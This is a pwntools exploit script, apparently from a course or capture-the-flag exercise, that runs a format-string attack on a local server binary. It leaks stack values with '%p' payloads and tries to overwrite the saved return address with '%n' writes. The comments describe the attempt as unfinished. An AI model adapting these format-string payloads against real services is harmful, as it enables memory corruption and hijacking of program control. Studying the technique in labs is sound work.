from pwn import *

context.clear(arch = 'amd64')
# Disable ASLR !

server = process('bin/server')
client = process(['bin/client', '127.0.0.1', '1337'])

login = "login Acidburn\n"
passw = "pass CrashOverride\n"
client.sendline(login)
client.sendline(passw)
log.info("server after login %s" % server.recv())
log.info("client after login %s" % client.recv())

N = 70

# Function called in order to send a payload
def send_payload(payload):
    log.info("payload = %s" % ("get " + repr(payload)))
    client.sendline("get " + payload)
    server_returns = server.recv()
    log.info("server returns: %s" % (server_returns))
    return server_returns

# Create a FmtStr object and give to him the function
#format_string = FmtStr(execute_fmt=send_payload, padlen=4)
#format_string.write(0x00007fffffffcd58, 0xAAAAAAAAAAAAAAAA) # write 0x1337babe at 0x0
# format_string.write(0x1337babe, 0x0) # write 0x0 at 0x1337babe
# format_string.execute_writes()

#test1 = 'get \x06\x05\x04\x08\x07\x05\x04\x08\x08\x05\x04\x08\t\x05\x04\x08%174c%5$hhn%252c%6$hhn%125c%7$hhn%220c%8$hhn'
def exectue_one(string):
    s = string
    client.sendline(s)
    print server.recv()
    client.recv()

def get_stack(size):
    #s = 'get %' + str(i) + '$11x'
    s = 'get ' + '%p.'*size
    client.sendline(s)
    res = server.recv()
    stack = res.split('.')
    client.recv()
    return stack


print "----------------------------------------------------------------------------"

byte_to_write_at_2 = 0
stack = get_stack(N)
for i in range(len(stack) - 1):
    # find stack addresses thanks to 32 / 36
    add36 = int(stack[36 - 1],16) - 0x20
    bottom_address = add36 - (35 * 8)
    print str(i + 1) + " " + str(hex(bottom_address + i * 8)) + " " + stack[i]


print "----------------------------------------------------------------------------"

attack = "get "

#old stack first
for i in range(N):
    attack += '%' + str(i+1) + '$p.'

# ---
# Look at that 32, 36 pair ! always fix, always 0x10 appart,
# always same offset to stack address
# stack address at 36 = stack[36 - 1] - 0x20
# stack address of rip = stack[36 - 1] - 0x20 + 0x28 # (41-36) * 8 = 40 = 0X28
# stack address of rip = stack[36 - 1] + 0x8

# ---
# Now realize that 16 points to 20, and value of 20 pretty close to address of 41
# -> use 16 to overwrite last byte of 20 to access 41 through 20 !
# Byte I need to write to 20 is d8 since:
# 41 0x7fffffffcdd8 0x55555555d806
byte_to_write_at_20 = str(hex(bottom_address + (41 - 1) * 8))[-2:]
print "byte to write at 20: " + byte_to_write_at_20

#attack = "%1$" + str(int(byte_to_write_at_20, 16)) + "c" + "%16$hhn%16$s"
attack += "%1$" + str(186) + "c" + "%16$n."

# now use address at 20 to write new rip
# the offset between old and new is
# 0x55555555d6f6 - 0x55555556364b = -5F55
hijack_flow_addr = int(stack[41-1],16) + 0x5F55

writes = {0x4142434445464748:   hijack_flow_addr}
payload = fmtstr_payload(40, writes, numbwritten=0)
#print payload

for i in range(N):
    attack += '%' + str(i+1) + '$p.'

client.sendline(attack)
res = server.recv()
attack_stack = res.split('.')


client.recv()

for i in range(N):
    if attack_stack[i] != attack_stack[i+N +1]:
        print str(i + 1) + " " + attack_stack[i] + " " + attack_stack[i+N + 1]

print(attack)

#exectue_one('get ' + attack)


print "----------------------------------------------------------------------------"

new_stack = get_stack(N)

for i in range(len(new_stack)-1):
    if new_stack[i] != stack[i]:
        print str(i +1) + " " + stack[i] + " " + new_stack[i]

print "----------------------------------------------------------------------------"

exectue_one("get %0$p%1$p")

#---------------------------------------------------
# Actually I cannot write and use newly written values in same format format_string
# thus this attemps gets way harder / impossible.

# Get final output
#log.info("server cleanup %s" % server.recv())
#log.info("client cleanup %s" % client.recv())

# Clean up
client.close()
server.close()
